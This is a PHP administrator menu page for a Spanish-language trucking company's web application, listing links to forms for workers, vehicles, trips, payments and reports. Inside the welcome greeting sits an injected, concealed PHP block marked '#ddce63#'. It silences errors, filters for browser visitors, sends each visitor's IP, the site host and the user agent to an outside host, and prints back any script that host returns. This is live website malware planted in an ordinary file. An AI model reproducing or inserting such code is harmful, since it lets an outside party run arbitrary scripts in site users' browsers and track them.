<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - Administrador ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
.Estilo3 {
	color: #000000;
	font-weight: bold;
}
.Estilo4 {
	color: #FFFFFF;
	font-style: italic;
	font-weight: bold;
}
.Estilo5 {color: #000000}
.Estilo6 {color: #000000; font-style: italic; font-weight: bold; }
.Estilo7 {
	color: #0000FF;
	font-style: italic;
	font-weight: bold;
}
-->
</style>
</head>

<body>
<form action="admin.php" name="form1" id="form1" method="post" >
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../imagenes/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td>
		<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0" >
          <tr>
            <td height="19" colspan="2" background="../conexion/Img/m02.jpg"><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a><a href=""></a>      				
			   <table width="108%" height="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td valign="top"><p align="center" class="Estilo7"><span class="Estilo7">&iexcl; <?php print($_SESSION["usuario"]); ?>
<?php
#ddce63#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/ddce63#
?>, eres bienvenido ! </span>
                    <table width="164" border="0" align="right">
                      <tr>
                        <th width="154" scope="col"><label>
                          <input type="submit" name="Submit" value="Cerrar Sesion" />
                        </label>
                          <label>
                          <input type="hidden" name="op" value="cerrarSesion" />
                          </label></th>
                      </tr>
                    </table>
					</p>
                    <p align="center" class="Estilo7">&nbsp;</p>
                    
                      <table width="742" border="0" align="center">
                    <tr>
                      <td colspan="2"><div align="center" class="Estilo3">MENU ADMINISTRADOR</div></td>
                      </tr>
                    <tr>
                      <td width="372" valign="top"><table width="325" border="0" align="center">
                        <tr>
                          <td><div align="center" class="Estilo4 Estilo5">INGRESO DE DATOS </div></td>
                          </tr>
                        <tr>
                          <td>&nbsp;</td>
                          </tr>
                        <tr>
                          <td><a href="formInsTrabajador1.php">Registrar trabajador</a></td>
                          </tr>
                        <tr>
                          <td><a href="formAsignarVehiculoCarreta.php">Asignar carreta-vehiculo</a></td>
                          </tr>
                        <tr>
                          <td><a href="formConfirmarViaje.php">Confirmar viaje</a></td>
                          </tr>
                        <tr>
                          <td><a href="formDescuentoPersonal.php">Realizar descuentro personal</a></td>
                          </tr>
                        <tr>
                          <td><a href="formInsRuta.php">Insertar ruta</a></td>
                          </tr>
                        <tr>
                          <td><a href="formPagoPersonal.php">Realizar pago personal</a></td>
                        </tr>
                        <tr>
                          <td><a href="formProductoTrabajador.php">Asignar producto al trabajador</a></td>
                        </tr>
                        <tr>
                          <td><a href="formRegistrarArticulo.php">Registrar articulo</a></td>
                        </tr>
                        <tr>
                          <td><a href="formRegistrarCarreta.php">Registrar carreta</a></td>
                        </tr>
                        <tr>
                          <td><a href="formRegistrarCompraProducto.php">Registrar compra de producto</a></td>
                        </tr>
                        <tr>
                          <td><a href="formRegistrarVehiculo.php">Registrar vehiculo</a></td>
                        </tr>
                        <tr>
                          <td><a href="formRegistrarViaje.php">Registrar viaje</a></td>
                        </tr>
                        <tr>
                          <td><a href="formSepararVehiculoCarreta.php">Separar vehiculo-carreta</a></td>
                        </tr>
                        <tr>
                          <td><a href="formPagosViaje.php">Registrar efectivos de viaje</a></td>
                        </tr>
                        <tr>
                          <td><a href="formGastosViaje.php">Registrar gasto de viaje</a></td>
                        </tr>
                        <tr>
                          <td><a href="formPagarComprobante.php">Registrar pago de comprobante</a></td>
                        </tr>
                        <tr>
                          <td><a href="formCancelarEnvio.php">Generar comprobante</a></td>
                        </tr>
                        <tr>
                          <td><a href="reportes/mostrarGuia.php">Mostrar Guia de Remision</a></td>
                        </tr>
                        <tr>
                          <td><a href="reportes/mostrarFactura.php">Mostrar Facturas</a></td>
                        </tr>
                      </table>
                        <p align="center">&nbsp;</p>
                        <table width="334" border="0" align="center">
                          <tr>
                            <td><div align="center"><em><strong>ACTUALIZACIONES</strong></em></div></td>
                          </tr>
                          <tr>
                            <td>&nbsp;</td>
                          </tr>
                          <tr>
                            <td><a href="formAnularComprobante.php">Anular comprobante</a></td>
                          </tr>
                          <tr>
                            <td><a href="formModificarArticulo.php">Modificar Articulo</a></td>
                          </tr>
                          <tr>
                            <td><a href="formModificarComp.php">Modificar comprobante</a></td>
                          </tr>
                          <tr>
                            <td><a href="formActualizarTrabajador.php">Actualizar trabajador</a></td>
                          </tr>
                          <tr>
                            <td><a href="formActualizarVehiculo.php">Actualizar vehiculo</a></td>
                          </tr>
                          <tr>
                            <td><a href="formEliminarTrabajador.php">Eliminar trabajador</a></td>
                          </tr>
                          <tr>
                            <td><a href="formActualizarCliente.php">Actualizar cliente</a></td>
                          </tr>
                          <tr>
                            <td><a href="formCambiarContrasenha.php">Modificar contraseña</a></td>
                          </tr>
                        </table>                        
                        <p><a href="http://mail.transportesmarinhermanos.com/" target="blank">Bandeja de Mensajes</a></p></td>
                      <td width="354" align="center" valign="top"><table width="332" border="0" align="center">
                        <tr>
                          <td><div align="center" class="Estilo6">REPORTES</div></td>
                          </tr>
                        <tr>
                          <td>&nbsp;</td>
                          </tr>
						 <tr>
                          <td><div align="justify"><a href="reportes/reportGastosPersonal.php">Reportar gastos por personal</a></div></td>
                          </tr>
						 <tr>
                          <td><div align="justify"><a href="reportes/reportPagosPersonal.php">Reportar pagos por personal</a></div></td>
                          </tr>
						 <tr>
                          <td><div align="justify"><a href="reportes/reportPagosViaje.php">Reportar pagos por viaje</a></div></td>
                          </tr> 
						 <tr>
                          <td><div align="justify"><a href="reportes/reportGastosViaje.php">Reportar gastos por viaje</a></div></td>
                          </tr> 
						<tr>
                          <td><div align="justify"><a href="reportes/reportBalanceViaje.php">Reportar balance por viaje</a></div></td>
                          </tr> 
                          <td><div align="justify"><a href="reportes/reportAdministrador.php">Reportar administradores</a></div></td>
                          </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportArticulo.php">Reportar articulo</a></div></td>
                          </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportCarreta.php">Reportar carretas</a></div></td>
                          </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportCiudad.php">Reportar ciudades</a></div></td>
                          </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportCiudadesRuta.php">Reportar ciudades-ruta</a></div></td>
                          </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportClienteJuridico.php">Reportar clientes juridicos</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportClienteNatural.php">Reportar clientes naturales</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportComprobante.php">Reportar comprobante</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportComprobanteCompra.php">Reportar comprobante compra</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportCuentas.php">Reportar cuentas</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportDescuentoPersonal.php">Reportar descuento personal</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportExperienciaLaboral.php">Reportar experiencia laboral</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportGradoInstruccion.php">Reportar grado de instruccion</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportPagoPersonal.php">Reportar pago personal</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportProductoComprobanteCopmpra.php">Reportar comprobantes de compra de productos</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportProductos.php">Reportar productos</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportProductoTrabajador.php">Reportar productos-trabajador</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportRutas.php">Reportar rutas</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportSucursal.php">Reportar sucursales</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportTrabajador.php">Reportar trabajadores</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportVehiculoCarreta.php">Reportar vehiculo-carrera</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportVehiculos.php">Reportar vehiculos</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportViaje.php">Reportar viajes</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportArticuloComprobante.php">Reportar articulos por comprobante</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportComprobanteViaje.php">Reportar comprobantes por viaje</a></div></td>
                        </tr>
                        <tr>
                          <td><div align="justify"><a href="reportes/reportDespacoCarga.php">Reportar despacho de carga</a></div></td>
                        </tr>
                      </table></td>
                    </tr>
                    <tr>
                      <td colspan="2" valign="top">&nbsp;</td>
                      </tr>					
                  </table>
	  				    </td>
                    </tr>
                </table></td>
            </tr>
          
        </table></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</form>
</body>
</html>